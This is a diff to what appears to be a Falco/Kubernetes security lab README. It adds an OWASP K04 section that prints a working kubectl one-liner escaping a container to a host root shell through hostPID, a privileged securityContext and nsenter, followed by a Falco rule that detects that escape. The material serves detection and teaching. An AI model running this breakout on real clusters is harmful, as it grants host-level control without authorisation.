@@ -140,6 +140,35 @@ Unnecessary use of ```cluster-admin``` (K03.01)
 kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Falco-MicroK8s/main/cluster-admin.yaml
 ```
 
+## K04 - Lack of Centralized Policy Enforcement
+
+The following command if run against the Kubernetes API will create a very special pod that is running a highly privileged container.
+1. First we see ```hostPID: true```, which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host.
+2. The ```nsenter``` command switches to a different ```mount``` namespace where pid 1 is running which is the host mount namespace.
+3. Finally, we ensure the workload is ```privileged``` allowing us to prevent permissions errors. Boom!! Container breakout achieved.
+
+```
+ kubectl run r00t --restart=Never -ti --rm --image lol \
+  --overrides '{"spec":{"hostPID": true, 
+  "containers":[{"name":"1","image":"alpine", 
+  "command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"], 
+  "stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent", 
+  "securityContext":{"privileged":true}}]}}' \
+/
+```
+Providing a limited-scope rule to prevent the container escape scenario highlighted above:
+```
+- rule: Nsenter Launched in Privileged Container
+  desc: Detect file system debugger nsenter launched inside a privileged container which might lead to container escape. This rule has a more narrow scope.
+  condition: >
+    spawned_process
+    and container
+    and container.privileged=true
+    and proc.name=nsenter
+  output: Nsenter launched started in a privileged container (evt_type=%evt.type user=%user.name user_uid=%user.uid user_loginuid=%user.loginuid process=%proc.name proc_exepath=%proc.exepath parent=%proc.pname command=%proc.cmdline terminal=%proc.tty exe_flags=%evt.arg.flags %container.info)
+  priority: WARNING
+  tags: [OWASP_K8S_T10, K05, mitre_privilege_escalation, T1611]
+```
 
 ## Cleanup
 ```
